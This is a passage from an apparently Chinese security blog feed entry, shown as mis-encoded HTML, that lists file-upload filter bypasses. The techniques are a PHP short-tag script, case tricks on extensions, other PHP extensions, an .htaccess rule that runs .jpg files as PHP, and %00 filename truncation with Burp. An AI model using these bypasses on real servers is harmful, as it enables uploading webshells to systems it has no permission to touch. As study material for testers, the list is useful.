title=&#34;ç»•è¿‡&#34;&gt;&lt;/a&gt;ç»•è¿‡&lt;/h5&gt;å¯ä»¥ä½¿ç”¨çŸ­tagç»•è¿‡ï¼Œä¾‹å¦‚&lt;br&gt;&lt;code&gt;&amp;lt;script language=&amp;#39;pHp&amp;#39;&amp;gt;phpinfo();&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;h4 id=&#34;æ£€æŸ¥æ–‡ä»¶å&#34;&gt;&lt;a href=&#34;#æ£€æŸ¥æ–‡ä»¶å&#34; class=&#34;headerlink&#34; title=&#34;æ£€æŸ¥æ–‡ä»¶å&#34;&gt;&lt;/a&gt;æ£€æŸ¥æ–‡ä»¶å&lt;/h4&gt;&lt;h5 id=&#34;åŸç†-3&#34;&gt;&lt;a href=&#34;#åŸç†-3&#34; class=&#34;headerlink&#34; title=&#34;åŸç†&#34;&gt;&lt;/a&gt;åŸç†&lt;/h5&gt;æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ…å«.php&lt;h5 id=&#34;ç»•è¿‡-3&#34;&gt;&lt;a href=&#34;#ç»•è¿‡-3&#34; class=&#34;headerlink&#34; title=&#34;ç»•è¿‡&#34;&gt;&lt;/a&gt;ç»•è¿‡&lt;/h5&gt;&lt;/li&gt;
&lt;li&gt;å¤§å°å†™ç»•è¿‡ï¼Œå¦‚.PhP&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å…¶ä»–å¯èƒ½è¢«APacheè§£æçš„åç¼€ï¼Œå¦‚ï¼ˆ.php4/.php5/.php7/.pht/.phtmlï¼‰&lt;/li&gt;
&lt;li&gt;åœ¨Apacheç¯å¢ƒä¸‹ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å…¶å®ƒåç¼€ä¹Ÿè¢«è§£æä¸ºphpè„šæœ¬æ‰§è¡Œã€‚.htaccessæ–‡ä»¶å†…å®¹ä¸ºï¼š&lt;br&gt;&lt;code&gt;AddType application/x-http-php .jpg &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;%00æˆªæ–­ï¼Œæ“ä½œæ–¹æ³•ï¼šä¸Šä¼ shell.jpgï¼ŒBurpæŠ“åŒ…ï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºshell.php%00.jpgï¼Œé€‰ä¸­%00ï¼Œè¿›è¡Œurl-decodeã€‚&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2019-09-10T09:01:12.000Z</updated>
    </entry>
</feed>
